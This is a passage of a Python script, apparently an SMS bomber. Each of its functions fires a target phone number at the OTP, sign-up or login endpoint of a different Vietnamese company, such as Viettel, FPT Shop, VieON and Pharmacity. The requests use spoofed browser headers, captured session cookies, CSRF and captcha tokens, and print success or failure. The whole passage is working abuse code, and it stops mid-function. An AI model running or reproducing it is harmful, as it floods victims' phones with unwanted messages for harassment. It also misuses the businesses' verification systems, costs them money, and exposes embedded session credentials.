        'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
        'dnt': '1',
        'origin': 'https://kingme.pro',
        'referer': 'https://kingme.pro/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
    }

    response = requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data)
    print(format_print("*", "sms3: THÀNH CÔNG!"))
        #--------------------------------------------------------------------------------------------------------------
        
        
#sms 4
def sms4(phone):
    headers = {'Host': 'vietteltelecom.vn','Connection': 'keep-alive','X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I','User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Accept': 'application/json, text/plain, */*','Referer': 'https://vietteltelecom.vn/dang-nhap',}
    data = {'phone': phone,'type': ''}
    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', json=data, headers=headers)
    result = response.json()
    print(format_print("*", "sms4: THÀNH CÔNG!"))
    
    
#sms 5
def sms5(phone):
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn',}
    response = requests.get('https://viettel.vn/dang-ky', headers=headers)
    token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-XSRF-TOKEN': token,'X-CSRF-TOKEN': token,'X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap',}
    data = {'msisdn': phone}
    response = requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers)
    result = response.json()
    print(format_print("*", "sms5: THÀNH CÔNG!"))
#sms 7


#sms 10
def sms7(phone):
    cookies = {'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF','__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1','XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',}
    headers = {'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','DNT': '1','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i','X-Requested-With': 'XMLHttpRequest','X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
    json_data = {'phone': phone,'type': '',}
    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    if '200' in response.text:
        print(format_print("*", "sms7: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms7: THẤT BẠI!"))   
#sms 11--------------------------------------------------------------------------------------------------------------------------


def sms8(phone):
    pw=random_string(10)
    headers = {
        'authority': 'products.popsww.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'api-key': '5d2300c2c69d24a09cf5b09b',
        'content-type': 'application/json',
        'dnt': '1',
        'lang': 'vi',
        'origin': 'https://pops.vn',
        'platform': 'web',
        'profileid': '657ca7582a4ac90054bcc10a',
        'referer': 'https://pops.vn/auth/signin-signup/signup',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sub-api-version': '1.1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-env': 'production',
    }

    json_data = {
        'fullName': '',
        'account': phone,
        'password': 'xX.j2!h5gAv',
        'confirmPassword': 'xX.j2!h5gAv',
        'recaptcha': '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
    }

    response = requests.post('https://products.popsww.com/api/v5/auths/register', headers=headers, json=json_data)
    if '"status":"PENDING"'in response.text:
        print(format_print("*", "sms8: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms8: THẤT BẠI!"))   
        
        
#sms 14
def sms9(phone):
    response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone})
    if response.status_code == 200:
        print(format_print("*", "sms9: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms9: THẤT BẠI!"))   
        
        
#sms 15
def sms10(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "sms10: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms10: THẤT BẠI!"))   
        
        
#sms 16
def sms11(phone):
    cookies = {
        'PHPSESSID': 'j7jhajmp8628ho9d98bckrhkog',
        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D',
        '_ga': 'GA1.1.1223576462.1703858206',
        '__utma': '65249340.1223576462.1703858206.1703858250.1703858250.1',
        '__utmc': '65249340',
        '__utmz': '65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
        '__utmt': '1',
        '_gcl_au': '1.1.854737399.1703858251',
        '_ga_DFG3FWNPBM': 'GS1.1.1703858205.1.1.1703858365.60.0.0',
        '__utmb': '65249340.2.10.1703858250',
        '__admUTMtime': '1703858368',
        '_tt_enable_cookie': '1',
        '_ttp': 'FLrVXJT5FMP_B9az47LH6-P6_GD',
        '_ga_BBD6001M29': 'GS1.1.1703858371.1.0.1703858371.60.0.0',
        '_fbp': 'fb.1.1703858371624.505444992',
        'dtdz': '39b60b4b-5c1c-40f7-a1fa-1775072dd497',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        'Srv': 'cc204|ZY7Qz|ZY7QH',
    }

    headers = {
        'authority': 'concung.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=j7jhajmp8628ho9d98bckrhkog; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D; _ga=GA1.1.1223576462.1703858206; __utma=65249340.1223576462.1703858206.1703858250.1703858250.1; __utmc=65249340; __utmz=65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; _gcl_au=1.1.854737399.1703858251; _ga_DFG3FWNPBM=GS1.1.1703858205.1.1.1703858365.60.0.0; __utmb=65249340.2.10.1703858250; __admUTMtime=1703858368; _tt_enable_cookie=1; _ttp=FLrVXJT5FMP_B9az47LH6-P6_GD; _ga_BBD6001M29=GS1.1.1703858371.1.0.1703858371.60.0.0; _fbp=fb.1.1703858371624.505444992; dtdz=39b60b4b-5c1c-40f7-a1fa-1775072dd497; __iid=; __iid=; __su=0; __su=0; Srv=cc204|ZY7Qz|ZY7QH',
        'dnt': '1',
        'origin': 'https://concung.com',
        'referer': 'https://concung.com/dang-nhap.html',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
        'classAjax': 'AjaxLogin',
        'methodAjax': 'sendOtpLogin',
        'customer_phone': phone,
        'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
        'captcha_key': '9a1b5162bfa438e4ead921afe49cc8d3',
        'id_customer': '0',
    }

    response = requests.post('https://concung.com/ajax.html?sendOtpLogin', cookies=cookies, headers=headers, data=data)
    if response.status_code == 200:
        print(format_print("*", "sms11: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms11: THẤT BẠI!"))   


#sms 24
def sms12(phone):
    cookies = {
        '_ga': 'GA1.1.2087670331.1693621115',
        'ajs_anonymous_id': 'f03d6d9e-8b96-4989-85e4-4a2f1aa5804d',
        'ApplicationGatewayAffinityCORS': 'e3a3e7f76978c3189d076edb90ce010d',
        'ApplicationGatewayAffinity': 'e3a3e7f76978c3189d076edb90ce010d',
        '_ga_05MHVHMYGR': 'GS1.1.1693621114.1.1.1693621123.0.0.0',
    }

    headers = {
        'authority': 'topenland.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        # 'cookie': '_ga=GA1.1.2087670331.1693621115; ajs_anonymous_id=f03d6d9e-8b96-4989-85e4-4a2f1aa5804d; ApplicationGatewayAffinityCORS=e3a3e7f76978c3189d076edb90ce010d; ApplicationGatewayAffinity=e3a3e7f76978c3189d076edb90ce010d; _ga_05MHVHMYGR=GS1.1.1693621114.1.1.1693621123.0.0.0',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get(
        'https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json',
        params=params,
        cookies=cookies,
        headers=headers,
    )

    print(format_print("*", "sms12: THÀNH CÔNG!"))
    
    
#sms 25
def sms13(phone):
    headers = {'authority': 'api-gateway.pharmacity.vn','accept': '*/*','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/json','dnt': '1','origin': 'https://www.pharmacity.vn','referer': 'https://www.pharmacity.vn/','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',}
    json_data = {'phone': phone,'referral': '',}
    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
    if 'success' in response.text:
        print(format_print("*", "sms13: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms13: THẤT BẠI!"))   
        
        
        
#sms 26
def sms14(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'DNT': '1',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': phone,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
    if '200' in response.text:
        print(format_print("*", "sms14: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms14: THẤT BẠI!"))   


#sms 32
def sms15(phone):
    headers = {
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
    if '"status":true' in response.text:
        print(format_print("*", "sms15: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms15: THẤT BẠI!"))   
#sms 33

#sms 34
def sms17(phone):
    headers = {
        'authority': 'v3.meeyid.com',
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://meeyid.com',
        'referer': 'https://meeyid.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-affilate-id': 'www.google.com',
        'x-browser-id': 'undefined',
        'x-client-id': 'meeyid',
        'x-partner-id': '',
        'x-time': '1703859585701',
        'x-token': 'MHgmvk9zRhqTcwMzg1OTU4NTcwMLJAC3S5jaUtJeFVNbklFQ2dsaHJwR0RvRGpqb055cG9sWEtzeEpWU23fN9RxHZkd5QlRORERiVXV3ekx3ZAmz1br1bbVMDvwcElNRGVEdEhES2Z4WU5wLjQyMDI0ZmYzYzJkZDcwZWEzYTQ5ODM3YjRkOWU1MjA3',
    }

    json_data = {
        'phone': phone,
        'phoneCode': '+84',
        'refCode': '',
    }

    response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data)
    if '"status":true' in response.text:
        print(format_print("*", "sms17: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms17: THẤT BẠI!"))   
        
        
#sms 35
def sms18(phone):
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
    if 'INVALID' in response.text:
        print(format_print("*", "sms18: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms18: THẤT BẠI!"))   


#sms 42
def sms19(phone):
    cookies = {
        '_gcl_aw': 'GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE',
        '_gcl_au': '1.1.2029065449.1703860145',
        '_ga': 'GA1.1.1085625881.1703860163',
        '_ga_GFJFDNFKH2': 'GS1.1.1703860162.1.0.1703860163.0.0.0',
        '_fbp': 'fb.1.1703860165993.477455233',
    }

    headers = {
        'authority': 'api.popeyes.vn',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': '_gcl_aw=GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE; _gcl_au=1.1.2029065449.1703860145; _ga=GA1.1.1085625881.1703860163; _ga_GFJFDNFKH2=GS1.1.1703860162.1.0.1703860163.0.0.0; _fbp=fb.1.1703860165993.477455233',
        'dnt': '1',
        'origin': 'https://popeyes.vn',
        'ppy': 'ULWQDN',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
